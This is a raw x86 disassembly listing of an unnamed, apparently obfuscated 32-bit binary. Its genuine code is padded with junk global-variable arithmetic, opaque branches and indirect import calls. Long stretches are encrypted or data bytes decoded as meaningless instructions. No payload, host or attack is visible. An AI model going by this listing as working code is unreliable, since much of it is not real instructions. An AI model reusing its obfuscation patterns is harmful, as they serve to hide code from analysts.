  417bf2:	call   0xdb5dae4e
  417bf7:	cmp    eax,0x130e03c9
  417bfc:	shl    BYTE PTR [edi+0x5],0x49
  417c00:	pop    edi
  417c01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c02:	sahf   
  417c03:	mov    eax,ds:0x57665c5f
  417c08:	pushf  
  417c09:	adc    BYTE PTR [edi],0x3
  417c0c:	jbe    0x417c54
  417c0e:	outs   dx,DWORD PTR ds:[esi]
  417c0f:	aas    
  417c10:	inc    ecx
  417c11:	add    al,0xf9
  417c13:	(bad)  
  417c14:	adc    eax,DWORD PTR [edi-0x2bf478b]
  417c1a:	mov    bh,0x8d
  417c1c:	sub    DWORD PTR [ebx],ebx
  417c1e:	data16 sub BYTE PTR [edi],dl
  417c21:	popf   
  417c22:	into   
  417c23:	xchg   DWORD PTR ds:0x2e567af3,ebp
  417c29:	inc    ebp
  417c2a:	sub    eax,0x6a657ce0
  417c2f:	aam    0xfd
  417c31:	push   ebp
  417c32:	mov    esi,0x1307d3ee
  417c37:	arpl   cx,sp
  417c39:	icebp  
  417c3a:	xchg   ecx,eax
  417c3b:	jno    0x417c25
  417c3d:	adc    DWORD PTR [ebx+ebx*4+0x7a],edi
  417c41:	mov    ebp,esp
  417c43:	inc    esp
  417c44:	jb     0x417c50
  417c46:	shr    DWORD PTR [esi+0x44],cl
  417c49:	cli    
  417c4a:	xchg   BYTE PTR [esi],dl
  417c4c:	and    eax,0xc530da69
  417c51:	xchg   BYTE PTR gs:[eax],dh
  417c54:	mov    ah,0x12
  417c56:	sbb    cl,bh
  417c58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c59:	sbb    eax,0x20132eb8
  417c5e:	dec    edi
  417c5f:	dec    ecx
  417c60:	jge    0x417beb
  417c62:	je     0x417c88
  417c64:	sbb    al,0x81
  417c66:	add    eax,0x4283d5
  417c6b:	aam    0x4d
  417c6d:	add    BYTE PTR [eax],al
  417c6f:	push   eax
  417c70:	and    DWORD PTR ds:0x42851d,0x2c3a
  417c7a:	call   0x40a112
  417c7f:	and    DWORD PTR ds:0x4283dd,0x42841d
  417c89:	push   0x4
  417c8b:	push   0x42252c
  417c90:	push   DWORD PTR [esp+0x14]
  417c94:	call   0x411c08
  417c99:	mov    eax,DWORD PTR [esp+0xc]
  417c9d:	mov    ecx,DWORD PTR [esp+0xc]
  417ca1:	xor    DWORD PTR ds:0x4283ed,ecx
  417ca7:	mov    eax,DWORD PTR [eax]
  417ca9:	mov    ecx,DWORD PTR [ecx]
  417cab:	cmp    DWORD PTR ds:0x42847d,0x0
  417cb2:	mov    DWORD PTR ds:0x428511,0x49de
  417cbc:	mov    ebx,0x75ce
  417cc1:	not    edx
  417cc3:	mov    edx,0x562b
  417cc8:	jmp    0x417d30
  417ccd:	mov    DWORD PTR ds:0x4283ed,0x3679
  417cd7:	cmp    DWORD PTR ds:0x42847d,0x0
  417cde:	jle    0x417d16
  417ce4:	push   0x3f3a
  417ce9:	push   0x428495
  417cee:	push   DWORD PTR [ebp-0x20]
  417cf1:	push   DWORD PTR [ebp-0x14]
  417cf4:	call   DWORD PTR ds:0x42e284
  417cfa:	xor    edx,DWORD PTR ds:0x4284ed
  417d00:	and    DWORD PTR ds:0x4282fd,0x535f
  417d0a:	mov    ebx,DWORD PTR ds:0x4282dd
  417d10:	and    DWORD PTR ds:0x4282cd,ebx
  417d16:	adc    ebx,ebx
  417d18:	neg    DWORD PTR ds:0x4283c1
  417d1e:	mov    edx,DWORD PTR ds:0x428435
  417d24:	mov    ebx,DWORD PTR ds:0x4284b1
  417d2a:	sub    ebx,edx
  417d2c:	imul   edx,DWORD PTR [edx+ebx*1]
  417d30:	shr    eax,0x1e
  417d33:	shl    ecx,0x2
  417d36:	cmp    DWORD PTR ds:0x4282d5,0x0
  417d3d:	mov    edx,0x88a
  417d42:	mov    DWORD PTR ds:0x42846d,0x5f12
  417d4c:	mov    DWORD PTR ds:0x4282f9,0x1abe
  417d56:	jmp    0x417da7
  417d5b:	mov    DWORD PTR ds:0x4283ed,edi
  417d61:	cmp    DWORD PTR ds:0x4282d5,0x0
  417d68:	ja     0x417d87
  417d6e:	push   DWORD PTR [ebp-0x20]
  417d71:	push   0x4282f1
  417d76:	push   DWORD PTR [ebp-0x18]
  417d79:	call   DWORD PTR ds:0x42e0fc
  417d7f:	sbb    ebx,ebx
  417d81:	or     DWORD PTR ds:0x428405,ecx
  417d87:	mov    DWORD PTR ds:0x428491,0x1aca
  417d91:	and    ebx,DWORD PTR ds:0x428509
  417d97:	adc    DWORD PTR ds:0x428499,0x890
  417da1:	xor    DWORD PTR ds:0x428305,edi
  417da7:	or     eax,ecx
  417da9:	and    ecx,0x4e3
  417daf:	mov    ecx,DWORD PTR [esp+0xc]
  417db3:	xor    eax,0xa5069bae
  417db8:	and    ebx,ebx
  417dba:	mov    DWORD PTR [ecx],eax
  417dbc:	lea    eax,[esp+0x40]
  417dc0:	sbb    ecx,DWORD PTR ds:0x4282cd
  417dc6:	mov    DWORD PTR [esp+0x98],eax
  417dcd:	jmp    0x41802a
  417dd2:	or     eax,0xb0eeb0bf
  417dd7:	scas   al,BYTE PTR es:[edi]
  417dd8:	(bad)  
  417dd9:	and    BYTE PTR [ebx],al
  417ddb:	inc    esp
  417ddc:	lods   al,BYTE PTR ds:[esi]
  417ddd:	jecxz  0x417e2c
  417ddf:	mov    edx,0xe6ebd16c
  417de4:	sar    BYTE PTR [esi-0x41413dcb],0xd5
  417deb:	mov    DWORD PTR [edi-0x27],ebp
  417dee:	inc    ecx
  417def:	shl    eax,1
  417df1:	pop    ss
  417df2:	shl    DWORD PTR [eax+0x12],cl
  417df5:	inc    ecx
  417df6:	mov    ebx,0x807f6a4f
  417dfb:	pop    ebx
  417dfc:	(bad)  
  417dfd:	mov    ebp,0xe4c3032e
  417e02:	inc    ebx
  417e03:	ja     0x417daa
  417e05:	iret   
  417e06:	mov    DWORD PTR [eax+0xe173d90],ebp
  417e0c:	or     DWORD PTR [ebx+0x21],0xfa94e786
  417e13:	and    esp,DWORD PTR [eax+0x4e5032f5]
  417e19:	pusha  
  417e1a:	jecxz  0x417dba
  417e1c:	adc    eax,0x8e218988
  417e21:	pop    ebp
  417e22:	lahf   
  417e23:	mov    ecx,0x3bf05a4d
  417e28:	call   esp
  417e2a:	icebp  
  417e2b:	popw   es
  417e2d:	arpl   WORD PTR [ecx+0x64],ax
  417e30:	stos   BYTE PTR es:[edi],al
  417e31:	xchg   BYTE PTR [esi+0xe],cl
  417e34:	repnz cmp bh,0x74
  417e38:	aas    
  417e39:	mov    DWORD PTR [edi-0x18866ee1],ebp
  417e3f:	jnp    0x417e4a
  417e41:	pop    es
  417e42:	aam    0xfe
  417e44:	arpl   bx,dx
  417e46:	pushf  
  417e47:	(bad)  [edx+eax*8+0x6f96c588]
  417e4e:	idiv   BYTE PTR [ebx-0x7a9a7529]
  417e54:	pop    edx
  417e55:	pushf  
  417e56:	loope  0x417e38
  417e58:	outs   dx,BYTE PTR ds:[esi]
  417e59:	imul   edx,DWORD PTR [edi+0x16],0x13
  417e5d:	in     eax,dx
  417e5e:	xor    dl,BYTE PTR ds:0x953ea67a
  417e64:	add    al,0xbf
  417e66:	and    bl,BYTE PTR [edx+0x5f]
  417e69:	(bad)  
  417e6a:	(bad)  
  417e6b:	xor    ch,BYTE PTR [ebx-0x4ce88b65]
  417e71:	repnz in eax,0xd
  417e74:	adc    eax,0xd7b37523
  417e79:	mov    dl,0x36
  417e7b:	scas   eax,DWORD PTR es:[edi]
  417e7c:	sub    ecx,DWORD PTR [ecx+0x13]
  417e7f:	sbb    DWORD PTR [ecx+0x5235e3d4],0x110588c4
  417e89:	sub    bl,BYTE PTR [eax+eiz*4+0x1a]
  417e8d:	cmp    DWORD PTR [eax+0x3f],0xb1f09805
  417e94:	mov    al,0x72
  417e96:	sub    eax,0xb057881f
  417e9b:	push   ecx
  417e9c:	push   ds
  417e9d:	inc    edx
  417e9e:	sub    eax,0x2dd2be03
  417ea3:	mov    eax,ds:0x3e07913d
  417ea8:	inc    ebx
  417ea9:	and    al,0xda
  417eab:	(bad)  
  417ead:	add    edx,DWORD PTR [edi+0x39a578c]
  417eb3:	jmp    0xaa8b:0xd5a0bdba
  417eba:	or     eax,0xb0faa4f
  417ebf:	sti    
  417ec0:	(bad)  [ecx-0x3c]
  417ec3:	arpl   WORD PTR [ebx+eax*8-0x4c],si
  417ec7:	lods   al,BYTE PTR ds:[esi]
  417ec8:	lahf   
  417ec9:	mov    dh,0x24
  417ecb:	adc    bl,dl
  417ecd:	dec    edi
  417ece:	in     eax,0xeb
  417ed0:	mov    esp,0xeb4ccbd6
  417ed5:	aad    0xf4
  417ed7:	inc    ebx
  417ed8:	mov    bl,0x18
  417eda:	push   0x5a
  417edc:	or     esp,DWORD PTR [ecx+edx*2-0x10]
  417ee0:	sub    ah,BYTE PTR es:[esi]
  417ee3:	shr    esi,1
  417ee5:	inc    esp
  417ee6:	mov    esi,DWORD PTR [esi+0x649af328]
  417eec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417eed:	leave  
  417eee:	inc    ecx
  417eef:	or     al,0xb0
  417ef1:	gs scas al,BYTE PTR es:[edi]
  417ef3:	shl    DWORD PTR [edx+ebp*8-0x3ea382f8],1
  417efa:	push   esi
  417efb:	cmp    BYTE PTR [edx-0x467d974],cl
  417f01:	in     eax,0x71
  417f03:	inc    eax
  417f04:	mov    edx,cs
  417f06:	fs addr16 inc ebx
  417f09:	ret    
  417f0a:	mov    ds:0xac5a3ebd,eax
  417f0f:	fs in  al,0x27
  417f12:	fcmovbe st,st(1)
  417f14:	mov    ah,BYTE PTR [edi]
  417f16:	jge    0x417f58
  417f18:	push   ebp
  417f19:	and    dh,dh
  417f1b:	inc    esp
  417f1c:	xor    al,0xb9
  417f1e:	cwde   
  417f1f:	xor    BYTE PTR [edx+ebp*8],bh
  417f22:	arpl   WORD PTR [ebx],dx
  417f24:	in     eax,dx
  417f25:	push   ss
  417f26:	repnz xchg edi,eax
  417f28:	mov    dl,0xe1
  417f2a:	mov    dh,0x70
  417f2c:	je     0x417f13
  417f2e:	hlt    
  417f2f:	xchg   esp,eax
  417f30:	or     BYTE PTR [edx+0x2f08492a],bl
  417f36:	push   eax
  417f37:	mov    dl,0x62
  417f39:	dec    ebx
  417f3a:	xchg   ebx,eax
  417f3b:	imul   esi,DWORD PTR [edx+0x7ea25feb],0xfbba64ca
  417f45:	bound  eax,QWORD PTR [edx-0x7f0b596a]
  417f4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f4c:	loop   0x417ee2
  417f4e:	ins    DWORD PTR es:[edi],dx
  417f4f:	push   cs
  417f50:	and    DWORD PTR [edi+0x11],ecx
  417f53:	jne    0x417f6d
  417f55:	add    ah,0x48
  417f58:	jnp    0x417fc0
  417f5a:	popa   
  417f5b:	(bad)  
  417f5c:	cmp    dh,BYTE PTR [ecx-0x32]
  417f5f:	jecxz  0x417fb3
  417f61:	or     edi,eax
  417f63:	mov    BYTE PTR ds:0x8644330b,dh
  417f69:	neg    DWORD PTR [esi+0xb9a4866]
  417f6f:	hlt    
  417f70:	adc    DWORD PTR [ebx-0x4],eax
  417f73:	in     al,0x28
  417f75:	hlt    
  417f76:	cli    
  417f77:	or     eax,0x2275f2a8
  417f7c:	xchg   esi,eax
  417f7d:	lods   al,BYTE PTR ds:[esi]
  417f7e:	xchg   edi,eax
  417f7f:	inc    esp
  417f80:	stos   DWORD PTR es:[edi],eax
  417f81:	pushf  
  417f82:	sub    dl,BYTE PTR [edx+0xadc9244]
  417f88:	sbb    al,0x96
  417f8a:	scas   eax,DWORD PTR es:[edi]
  417f8b:	lods   eax,DWORD PTR ds:[esi]
  417f8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f8d:	lea    ebp,ds:0xc31f4b56
  417f93:	mov    esi,0x836716fa
  417f98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f99:	aam    0xb2
  417f9b:	mov    ah,0x82
  417f9d:	ficom  WORD PTR [ebp-0x4e]
  417fa0:	test   DWORD PTR [edx+ecx*2-0x6df70c88],edi
  417fa7:	imul   edi,DWORD PTR [eax],0x3d6c32a5
  417fad:	mov    ah,0x5c
  417faf:	xchg   BYTE PTR [eax],ah
  417fb1:	aam    0x3a
  417fb3:	xor    DWORD PTR [edi],edi
  417fb5:	clc    
  417fb6:	pop    esp
  417fb7:	aad    0xfe
  417fb9:	int3   
  417fba:	call   0xcd9d:0x82ae2456
  417fc1:	mov    al,ds:0xde4ba697
  417fc6:	ds pop ebp
  417fc8:	pop    es
  417fc9:	xchg   ebp,eax
  417fca:	ja     0x418002
  417fcc:	in     eax,dx
  417fcd:	and    eax,0x38513e13
  417fd2:	lods   eax,DWORD PTR ds:[esi]
  417fd3:	je     0x417fca
  417fd5:	call   0x5d3c9fa6
  417fda:	dec    ebp
  417fdb:	dec    DWORD PTR [ebx+0x3b563e78]
  417fe1:	mov    esp,0xdaea9ba2
  417fe6:	nop
  417fe7:	iret   
  417fe8:	cmp    al,0xc8
  417fea:	sar    DWORD PTR [eax+0x6e48d9f1],cl
  417ff0:	mov    BYTE PTR [ebx+ecx*8-0x6624444],ch
  417ff7:	and    cl,ah
  417ff9:	js     0x418052
  417ffb:	lea    edx,[eax+ebp*2]
  417ffe:	rcr    DWORD PTR [edi],1
  418000:	fidiv  DWORD PTR [ebp+0x3f]
  418003:	inc    eax
  418004:	inc    esi
  418005:	mov    cl,0x47
  418007:	cs ins BYTE PTR es:[edi],dx
  418009:	repnz sub al,0x9e
  41800c:	push   ss
  41800d:	pop    es
  41800e:	mov    WORD PTR [edx+0x6e],?
  418011:	mov    al,ds:0xa6fd912b
  418016:	fld    QWORD PTR [edx+edi*2]
  418019:	cmp    BYTE PTR [edi],0xc6
  41801c:	nop
  41801d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41801e:	sar    al,0xf3
  418021:	mov    al,ds:0x42cce9c
  418026:	into   
  418027:	or     al,BYTE PTR [edi-0x2]
  41802a:	lea    eax,[esp+0x98]
  418031:	cmp    DWORD PTR ds:0x4283fd,0x0
  418038:	mov    DWORD PTR ds:0x4282d5,0x1551
  418042:	mov    DWORD PTR ds:0x4284e5,0x780e
  41804c:	mov    DWORD PTR ds:0x4282d9,0x4b14
  418056:	jmp    0x418149
  41805b:	mov    DWORD PTR ds:0x4282e1,edx
  418061:	mov    DWORD PTR ds:0x4282dd,0x4140
  41806b:	cmp    DWORD PTR ds:0x4283fd,0x0
  418072:	je     0x4180ae
  418078:	push   0x428191
  41807d:	push   0x4280f7
  418082:	call   DWORD PTR ds:0x42e288
  418088:	mov    ecx,DWORD PTR ds:0x428435
  41808e:	xor    ebx,ebx
  418090:	or     ebx,DWORD PTR ds:0x4284dd
  418096:	sub    ebx,ecx
  418098:	and    ecx,DWORD PTR [ecx+ebx*1]
  41809b:	mov    ecx,DWORD PTR ds:0x4283a5
  4180a1:	adc    DWORD PTR ds:0x4284a1,ecx
  4180a7:	inc    edx
  4180a8:	and    DWORD PTR ds:0x4283ed,edi
  4180ae:	adc    DWORD PTR ds:0x428479,edx
  4180b4:	xor    ebx,ebx
  4180b6:	or     ebx,DWORD PTR ds:0x428351
  4180bc:	mov    ebx,DWORD PTR [ebx]
  4180be:	sub    DWORD PTR ds:0x4283c5,ebx
  4180c4:	xor    DWORD PTR ds:0x428489,0x2cb6
  4180ce:	cmp    DWORD PTR ds:0x428405,0x0
  4180d5:	mov    DWORD PTR ds:0x4283ed,edx
  4180db:	mov    edx,DWORD PTR ds:0x42847d
  4180e1:	jmp    0x418149
  4180e6:	mov    DWORD PTR ds:0x42851d,ebx
  4180ec:	cmp    DWORD PTR ds:0x428405,0x0
  4180f3:	jg     0x41811b
  4180f9:	push   0x4283b1
  4180fe:	push   0x1e32
  418103:	call   DWORD PTR ds:0x42e28c
  418109:	or     DWORD PTR ds:0x428309,ecx
  41810f:	adc    DWORD PTR ds:0x4284e9,0x3832
  418119:	not    ecx
  41811b:	sub    edx,DWORD PTR ds:0x428415
  418121:	mov    edx,DWORD PTR ds:0x428329
  418127:	mov    ebx,DWORD PTR ds:0x4284b1
  41812d:	sub    ebx,edx
  41812f:	sub    edx,DWORD PTR [edx+ebx*1]
  418132:	or     ecx,DWORD PTR ds:0x4284e9
  418138:	mov    ebx,DWORD PTR ds:0x428359
  41813e:	mov    ecx,DWORD PTR ds:0x428559
  418144:	sub    ecx,ebx
  418146:	or     ebx,DWORD PTR [ebx+ecx*1]
  418149:	mov    DWORD PTR [esp+0x9c],eax
  418150:	and    DWORD PTR ds:0x4283f1,ebx
  418156:	mov    eax,DWORD PTR [esp+0x40]
  41815a:	sub    DWORD PTR [esp+0x40],eax
  41815e:	mov    edx,DWORD PTR ds:0x42851d
  418164:	sub    DWORD PTR ds:0x4283fd,edx
  41816a:	lea    eax,[ebp+0x4]
  41816d:	cmp    DWORD PTR ds:0x428515,0x0
  418174:	mov    DWORD PTR ds:0x42847d,0x1e13
  41817e:	mov    ecx,0x65ab
  418183:	jmp    0x4181f4
  418188:	mov    ecx,0x6be4
  41818d:	mov    edx,0x487
  418192:	cmp    DWORD PTR ds:0x428515,0x0
  418199:	jge    0x4181bd
  41819f:	push   DWORD PTR [ebp-0x1c]
  4181a2:	push   0x28cd
  4181a7:	call   DWORD PTR ds:0x42e100
  4181ad:	sub    DWORD PTR ds:0x428415,ebx
  4181b3:	add    DWORD PTR ds:0x428519,0x4283e1
  4181bd:	mov    ebx,DWORD PTR ds:0x428501
  4181c3:	sbb    ebx,DWORD PTR ds:0x4283a9
  4181c9:	mov    DWORD PTR ds:0x428501,ebx
  4181cf:	mov    edx,DWORD PTR ds:0x42834d
  4181d5:	mov    ebx,DWORD PTR ds:0x4284c9
  4181db:	sub    edx,ebx
  4181dd:	add    edx,DWORD PTR [edx+ebx*1]
  4181e0:	mov    ebx,DWORD PTR ds:0x4282cd
  4181e6:	and    ebx,DWORD PTR ds:0x4283c9
  4181ec:	mov    DWORD PTR ds:0x4282cd,ebx
  4181f2:	not    edx
  4181f4:	xor    DWORD PTR [esp+0x40],eax
  4181f8:	mov    DWORD PTR [esp+0x30],0x5b3d
  418200:	cmp    DWORD PTR ds:0x4284fd,0x0
  418207:	mov    DWORD PTR ds:0x428485,0x564a
  418211:	mov    DWORD PTR ds:0x428405,ecx
  418217:	jmp    0x4184c9
  41821c:	mov    eax,0x378f
  418221:	cmp    DWORD PTR ds:0x4284fd,0x0
  418228:	ja     0x41824a
  41822e:	push   0x77e8
  418233:	push   0x361b
  418238:	call   DWORD PTR ds:0x42e104
  41823e:	and    ebx,0x2889
  418244:	not    ebx
  418246:	or     edx,ecx
  418248:	sbb    ecx,ecx
  41824a:	xor    ecx,ecx
  41824c:	xor    ecx,DWORD PTR ds:0x4283f9
  418252:	adc    DWORD PTR ds:0x42850d,ecx
  418258:	xor    DWORD PTR ds:0x4282e5,0x4309
  418262:	sub    DWORD PTR ds:0x428315,0x3ee2
  41826c:	jmp    0x4184c9
  418271:	inc    esp
  418272:	inc    edx
  418273:	in     al,dx
  418274:	xor    ah,ch
  418276:	mov    eax,0x8987b29c
  41827b:	test   bh,cl
  41827d:	pusha  
  41827e:	mov    al,0xb0
  418280:	iret   
  418281:	fs jmp 0xbebe:0xc235bec0
  418289:	mov    gs,WORD PTR [ebp-0x2a0a3e80]
  41828f:	pop    eax
  418290:	pop    ds
  418291:	and    eax,0x9bd84078
  418296:	js     0x4182a4
  418298:	mov    bh,0xe7
  41829a:	pop    es
  41829b:	cld    
  41829c:	and    ebp,edi
  41829e:	fistp  DWORD PTR [eax]
  4182a0:	and    al,0x31
  4182a2:	loop   0x418295
  4182a4:	inc    eax
  4182a5:	pop    esi
  4182a6:	inc    esp
  4182a7:	add    eax,0xf7e7aa09
  4182ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182ad:	push   esi
  4182ae:	ja     0x41832c
  4182b0:	call   0xf4c8625d
  4182b5:	adc    DWORD PTR ds:0x7a4b5912,eax
  4182bb:	sub    DWORD PTR [edx],ecx
  4182bd:	mov    bl,0xfa
  4182bf:	cld    
  4182c0:	add    BYTE PTR [eax],ah
  4182c2:	or     DWORD PTR [ebx-0x555dc88c],ebp
  4182c8:	inc    eax
  4182c9:	jnp    0x41832a
  4182cb:	fmul   st(5),st
  4182cd:	sub    al,0x2a
  4182cf:	inc    esp
  4182d0:	add    bl,BYTE PTR [eax+0x395ae28b]
  4182d6:	inc    ecx
  4182d7:	and    ebp,DWORD PTR [esi+0x47]
  4182da:	xor    DWORD PTR [edx-0x2c918b8],ecx
  4182e0:	dec    ecx
  4182e1:	in     al,0xc0
  4182e3:	js     0x418274
  4182e5:	mov    esp,0x25baba77
  4182ea:	sbb    edi,DWORD PTR [esi]
  4182ec:	jle    0x4182c0
  4182ee:	adc    bl,BYTE PTR [edi-0x7cd59174]
  4182f4:	jg     0x41828c
  4182f6:	jecxz  0x4182c0
  4182f8:	stos   BYTE PTR es:[edi],al
  4182f9:	pop    ebx
  4182fa:	nop
  4182fb:	retf   
  4182fc:	nop
  4182fd:	das    
  4182fe:	scas   al,BYTE PTR es:[edi]
  4182ff:	addr16 xchg ebp,eax
  418301:	(bad)  
  418302:	(bad)  
  418303:	sub    DWORD PTR [ecx-0x6da2e1b0],ebp
  418309:	std    
  41830a:	pop    ss
  41830b:	pop    eax
  41830c:	pop    ebp
  41830d:	and    al,0xb8
  41830f:	xor    ch,bh
  418311:	or     al,0x6b
  418313:	shl    BYTE PTR [ebp+eax*4-0x11],0x92
  418318:	or     al,0x36
  41831a:	mov    al,ds:0xa82bd190
  41831f:	dec    eax
  418320:	jb     0x418323
  418322:	outs   dx,DWORD PTR ds:[esi]
  418323:	test   BYTE PTR [eax],dl
  418325:	leave  
  418326:	pop    ss
  418327:	(bad)  
  418328:	call   FWORD PTR [eax]
  41832a:	fs enter 0x5053,0xf
  41832f:	lods   al,BYTE PTR ds:[esi]
  418330:	retf   0x4bd2
  418333:	jmp    0x4183a3
  418335:	add    dh,BYTE PTR [ecx]
  418337:	or     BYTE PTR [ebx-0x5c0e625b],0x2a
  41833e:	ret    0xabc0
  418341:	pop    edi
  418342:	dec    ecx
  418343:	call   0x3e5e:0x807d2e46
  41834a:	mov    eax,0x994ebbc1
  41834f:	ficomp WORD PTR [esp+ebp*8+0x14]
  418353:	(bad)  
  418354:	lds    ecx,FWORD PTR [ecx-0x75]
  418357:	loopne 0x41835b
  418359:	hlt    
  41835a:	in     eax,0x65
  41835c:	test   eax,0x846a0a87
  418361:	xchg   ebp,eax
  418362:	test   esp,ecx
  418364:	cmp    al,0x60
  418366:	jbe    0x4183a5
  418368:	xchg   edi,eax
  418369:	bound  eax,QWORD PTR [ecx-0x2d]
  41836c:	fisttp DWORD PTR [eax-0x27ef29a7]
  418372:	mov    edi,DWORD PTR [ebx-0x16520185]
  418378:	or     dh,0xf5
  41837b:	int3   
  41837c:	cli    
  41837d:	jmp    0x74c3:0xd537c27d
  418384:	rcr    DWORD PTR [eax+0x6d],1
  418387:	sbb    al,0x6e
  418389:	or     BYTE PTR ds:0x4120bb12,cl
  41838f:	jle    0x418349
  418391:	pop    edi
  418392:	sti    
  418393:	push   0x61f87f98
  418398:	inc    ebp
  418399:	push   ss
  41839a:	lea    edx,[ebx+0x3eb59919]
  4183a0:	das    
  4183a1:	out    0xa3,al
  4183a3:	lea    esp,[ebx]
  4183a5:	clc    
  4183a6:	mov    esp,0x8803aad1
  4183ab:	sub    DWORD PTR [ecx+0x7ca69e5f],edx
  4183b1:	out    dx,eax
  4183b2:	jle    0x418401
  4183b4:	jmp    0xf4118470
  4183b9:	aas    
  4183ba:	xor    al,BYTE PTR [ecx+0x40]
  4183bd:	and    eax,0x5d9635dd
  4183c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4183c3:	fidivr WORD PTR [edi-0x2]
  4183c6:	and    eax,0xba4f89cb
  4183cb:	sbb    eax,0xe04762
  4183d0:	mov    esp,0x2678236b
  4183d5:	add    ecx,DWORD PTR [eax]
  4183d7:	out    0x74,eax
  4183d9:	gs sahf 
  4183db:	fild   QWORD PTR [edx-0x61]
  4183de:	cmp    ah,BYTE PTR [ebp+0x62141248]
  4183e4:	jg     0x4183cb
  4183e6:	jno    0x418402
  4183e8:	sbb    eax,0xddf79ca4
  4183ed:	dec    edi
  4183ee:	adc    ebx,ecx
  4183f0:	adc    eax,DWORD PTR [ebx+0x20]
  4183f3:	jle    0x418414
  4183f5:	pushf  
  4183f6:	adc    esp,ebp
  4183f8:	xor    eax,0x43ee7684
  4183fd:	mov    al,ds:0x87b234e2
  418402:	adc    esp,DWORD PTR [esi-0x7f]
  418405:	mov    bl,0xa3
  418407:	push   ss
  418408:	mov    al,0x62
  41840a:	push   es
  41840b:	sahf   
  41840c:	daa    
  41840d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41840e:	lahf   
  41840f:	in     eax,dx
  418410:	inc    edx
  418411:	loopne 0x418469
  418413:	push   0xffffff9d
  418415:	mov    esp,0x8f609954
  41841a:	add    al,dh
  41841c:	sub    al,0xa8
  41841e:	fistp  WORD PTR [ebx+0x72c0c9e]
  418424:	adc    ebp,DWORD PTR [ecx]
  418426:	les    edx,FWORD PTR [ebx]
  418428:	pop    edi
  418429:	(bad)  
  41842a:	jne    0x4183fc
  41842c:	mov    bh,0xba
  41842e:	mov    edi,0x426fe179
  418433:	data16 add ah,cl
  418436:	xor    DWORD PTR [ecx],eax
  418438:	fldcw  WORD PTR [edi]
  41843a:	out    0x9c,al
  41843c:	jno    0x4183ef
  41843e:	outs   dx,BYTE PTR ds:[esi]
  41843f:	int    0xe2
  418441:	push   ss
  418442:	call   0xee64:0x38706d54
  418449:	pop    eax
  41844a:	cmp    DWORD PTR [ecx],ecx
  41844c:	pop    esp
  41844d:	xchg   dl,ch
  41844f:	pop    ebx
  418450:	call   DWORD PTR [ebx+0x20]
  418453:	xchg   DWORD PTR [esi+0x3ffee97],ebx
  418459:	loopne 0x418481
  41845b:	nop
  41845c:	sbb    ebx,ebp
  41845e:	shr    DWORD PTR [ebp+0x151af6ac],1
  418464:	inc    esp
  418465:	mov    eax,0x12a990e8
  41846a:	mov    BYTE PTR [edi-0x3135a8f6],0x65
  418471:	pop    ss
  418472:	lods   eax,DWORD PTR ds:[esi]
  418473:	sub    DWORD PTR [ebp+0x75],esi
  418476:	jns    0x418437
  418478:	mov    ebx,0xa90c1990
  41847d:	dec    ecx
  41847e:	pusha  
  41847f:	jbe    0x4184f0
  418481:	dec    edi
  418482:	imul   ebx,DWORD PTR [esi+0x31462739],0xb34e96c2
  41848c:	cld    
  41848d:	cs test eax,0x5ea23329
  418493:	aaa    
  418494:	sub    BYTE PTR [ecx-0x31],bh
  418497:	mov    ebp,0x10203d8d
  41849c:	adc    eax,0x8733be8c
  4184a1:	leave  
  4184a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184a3:	mov    bl,BYTE PTR [edi]
  4184a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184a6:	sub    al,0x59
  4184a8:	es aaa 
  4184aa:	adc    ebp,DWORD PTR [ecx+0x18]
  4184ad:	pop    es
  4184ae:	and    DWORD PTR [ebp-0x5f],ebp
  4184b1:	sbb    BYTE PTR [ecx+0x50f3314c],ah
  4184b7:	call   0x1ef3a865
  4184bc:	aas    
  4184bd:	frstor [edi-0x5f44ea33]
  4184c3:	mov    edx,DWORD PTR [edx]
  4184c5:	jno    0x4184aa
  4184c7:	cs jne 0x418491
  4184ca:	inc    esp
  4184cb:	and    al,0x34
  4184cd:	inc    ebp
  4184ce:	inc    esp
  4184cf:	add    BYTE PTR [eax],al
  4184d1:	mov    DWORD PTR [esp+0x10],0xa52
  4184d9:	mov    DWORD PTR [esp+0x14],0x1c69
  4184e1:	mov    eax,DWORD PTR [esp+0x10]
  4184e5:	mov    ecx,DWORD PTR [esp+0x14]
  4184e9:	mov    edx,DWORD PTR [esp+0x30]
  4184ed:	mov    ebx,DWORD PTR [esp+0x34]
  4184f1:	add    eax,0xffffd1a5
  4184f6:	adc    ecx,0xffffedf0
  4184fc:	xor    eax,edx
  4184fe:	xor    ecx,ebx
  418500:	and    eax,0x325d
  418505:	mov    DWORD PTR [esp+0x50],eax
  418509:	and    ecx,0x3544
  41850f:	mov    DWORD PTR [esp+0x54],ecx
  418513:	mov    DWORD PTR [esp+0x48],0x1704
  41851b:	mov    DWORD PTR [esp+0x4c],0x4a75
  418523:	mov    DWORD PTR [esp+0x30],0x985
  41852b:	mov    DWORD PTR [esp+0x34],0x341
  418533:	mov    DWORD PTR [esp+0x10],0x5aa9
  41853b:	mov    DWORD PTR [esp+0x14],0x221a
  418543:	mov    eax,DWORD PTR [esp+0x10]
  418547:	mov    ecx,DWORD PTR [esp+0x14]
  41854b:	mov    edx,DWORD PTR [esp+0x30]
  41854f:	mov    ebx,DWORD PTR [esp+0x34]
  418553:	push   ebx
  418554:	push   edx
  418555:	or     ecx,0xc32
  41855b:	or     eax,0x502a
  418560:	push   ecx
  418561:	push   eax
  418562:	call   0x41594e
  418567:	mov    ecx,DWORD PTR [esp+0x48]
  41856b:	mov    ebx,DWORD PTR [esp+0x4c]
  41856f:	sub    eax,ecx
  418571:	mov    ecx,DWORD PTR [esp+0x50]
  418575:	sbb    edx,ebx
  418577:	mov    ebx,DWORD PTR [esp+0x54]
  41857b:	cmp    ecx,eax
  41857d:	jne    0x41858b
  418583:	cmp    ebx,edx
  418585:	je     0x41a937
  41858b:	mov    DWORD PTR [esp+0x30],0x71ba
